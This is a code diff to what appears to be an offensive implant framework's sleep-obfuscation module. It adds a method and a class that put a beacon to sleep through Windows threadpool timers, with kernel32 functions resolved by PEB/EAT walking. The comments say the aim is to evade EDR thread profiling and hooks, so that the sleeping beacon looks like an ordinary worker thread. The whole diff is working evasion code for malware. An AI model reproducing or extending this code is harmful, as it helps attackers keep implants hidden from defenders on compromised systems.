@@ -595,6 +595,58 @@ class AIAdaptiveSleepObfuscator:
         except Exception:
             return False
     
+    def _async_threadpool_sleep(self, delay_ms: int) -> bool:
+        """
+        Sleep using Windows Threadpool Timer.
+        Thread appears as TP Worker, not sleeping beacon.
+        Uses PEB/EAT walking for API resolution (no IAT hooks).
+        """
+        try:
+            from evasion.peb_eat_walker import get_peb_finder
+            finder = get_peb_finder()
+            kernel32_base = finder.get_module_base("kernel32.dll")
+            
+            if not kernel32_base:
+                return False
+            
+            cb_addr = finder.get_proc_address_manual(kernel32_base, "CreateThreadpoolTimer")
+            sb_addr = finder.get_proc_address_manual(kernel32_base, "SetThreadpoolTimer")
+            wb_addr = finder.get_proc_address_manual(kernel32_base, "WaitForThreadpoolTimerCallbacks")
+            cl_addr = finder.get_proc_address_manual(kernel32_base, "CloseThreadpoolTimer")
+            
+            if not all([cb_addr, sb_addr, wb_addr, cl_addr]):
+                return False
+            
+            CreateThreadpoolTimer = ctypes.WINFUNCTYPE(
+                ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p
+            )(cb_addr)
+            SetThreadpoolTimer = ctypes.WINFUNCTYPE(
+                None, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int64), ctypes.c_uint, ctypes.c_uint
+            )(sb_addr)
+            WaitForThreadpoolTimerCallbacks = ctypes.WINFUNCTYPE(
+                None, ctypes.c_void_p, ctypes.c_bool
+            )(wb_addr)
+            CloseThreadpoolTimer = ctypes.WINFUNCTYPE(
+                None, ctypes.c_void_p
+            )(cl_addr)
+            
+            callback_proto = ctypes.WINFUNCTYPE(None, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)
+            def dummy_callback(instance, context, timer):
+                pass
+            callback_func = callback_proto(dummy_callback)
+            
+            h_timer = CreateThreadpoolTimer(callback_func, None, None)
+            if not h_timer:
+                return False
+            
+            filetime_val = ctypes.c_int64(-int(delay_ms * 10000))
+            SetThreadpoolTimer(h_timer, ctypes.byref(filetime_val), 0, 0)
+            WaitForThreadpoolTimerCallbacks(h_timer, True)
+            CloseThreadpoolTimer(h_timer)
+            return True
+        except Exception:
+            return False
+    
     def _wait_for_single_object_sleep(self, delay_ms: int):
         """
         Sleep using WaitForSingleObject on a never-signaled event
@@ -834,6 +886,7 @@ class AIAdaptiveSleepObfuscator:
         
         # Select syscall method based on OPSEC level and EDR
         syscall_methods = [
+            (self._async_threadpool_sleep, 4),  # Threadpool timer - best stealth
             (self._indirect_ntdelay_execution, 4),  # Most stealthy
             (self._wait_for_single_object_sleep, 3),
             (self._alertable_sleep, 2),
@@ -1106,6 +1159,109 @@ class SleepMask:
             sensitive_data=sensitive_data
         )
         return result
+
+
+# =============================================================================
+# ASYNC THREADPOOL SLEEP (EDR Thread Profiler Evasion)
+# =============================================================================
+
+class AsyncThreadPoolSleep:
+    """
+    EDR Thread Profiler telemetry evasion via Windows Threadpool Timer.
+    
+    Instead of blocking the thread with NtDelayExecution/time.sleep,
+    this uses CreateThreadpoolTimer to schedule a callback. The thread
+    appears as a TP Worker thread waiting for work, not a sleeping beacon.
+    
+    Requires: PEB/EAT walker for manual API resolution (no IAT hooks).
+    """
+
+    def __init__(self):
+        self.finder = None
+        self.kernel32_base = None
+        self._CreateThreadpoolTimer = None
+        self._SetThreadpoolTimer = None
+        self._WaitForThreadpoolTimerCallbacks = None
+        self._CloseThreadpoolTimer = None
+        self._setup_stealth_apis()
+
+    def _setup_stealth_apis(self):
+        """Resolve Threadpool APIs via PEB/EAT walking."""
+        try:
+            from evasion.peb_eat_walker import get_peb_finder
+            self.finder = get_peb_finder()
+            self.kernel32_base = self.finder.get_module_base("kernel32.dll")
+            
+            if not self.kernel32_base:
+                return
+            
+            cb_addr = self.finder.get_proc_address_manual(self.kernel32_base, "CreateThreadpoolTimer")
+            sb_addr = self.finder.get_proc_address_manual(self.kernel32_base, "SetThreadpoolTimer")
+            wb_addr = self.finder.get_proc_address_manual(self.kernel32_base, "WaitForThreadpoolTimerCallbacks")
+            cl_addr = self.finder.get_proc_address_manual(self.kernel32_base, "CloseThreadpoolTimer")
+            
+            if cb_addr:
+                self._CreateThreadpoolTimer = ctypes.WINFUNCTYPE(
+                    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p
+                )(cb_addr)
+            if sb_addr:
+                self._SetThreadpoolTimer = ctypes.WINFUNCTYPE(
+                    None, ctypes.c_void_p, ctypes.POINTER(ctypes.c_int64), ctypes.c_uint, ctypes.c_uint
+                )(sb_addr)
+            if wb_addr:
+                self._WaitForThreadpoolTimerCallbacks = ctypes.WINFUNCTYPE(
+                    None, ctypes.c_void_p, ctypes.c_bool
+                )(wb_addr)
+            if cl_addr:
+                self._CloseThreadpoolTimer = ctypes.WINFUNCTYPE(
+                    None, ctypes.c_void_p
+                )(cl_addr)
+        except Exception:
+            pass
+
+    def stealth_sleep(self, duration_ms: int) -> bool:
+        """
+        Sleep using Threadpool Timer.
+        Thread appears as TP Worker, not sleeping beacon.
+        """
+        if not self._CreateThreadpoolTimer or not self._SetThreadpoolTimer:
+            return False
+        
+        try:
+            # Dummy callback
+            callback_proto = ctypes.WINFUNCTYPE(None, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)
+            def dummy_callback(instance, context, timer):
+                pass
+            callback_func = callback_proto(dummy_callback)
+            
+            # Create timer
+            h_timer = self._CreateThreadpoolTimer(callback_func, None, None)
+            if not h_timer:
+                return False
+            
+            # FILETIME negative = relative time (100-nanosecond intervals)
+            filetime_val = ctypes.c_int64(-int(duration_ms * 10000))
+            
+            # Set timer
+            self._SetThreadpoolTimer(h_timer, ctypes.byref(filetime_val), 0, 0)
+            
+            # Wait for callback (thread is in TP Worker queue, not DelayExecution)
+            self._WaitForThreadpoolTimerCallbacks(h_timer, True)
+            
+            # Cleanup
+            self._CloseThreadpoolTimer(h_timer)
+            return True
+        except Exception:
+            return False
+
+    def is_available(self) -> bool:
+        """Check if Threadpool APIs are resolved."""
+        return all([
+            self._CreateThreadpoolTimer,
+            self._SetThreadpoolTimer,
+            self._WaitForThreadpoolTimerCallbacks,
+            self._CloseThreadpoolTimer,
+        ])
 
 
 # =============================================================================
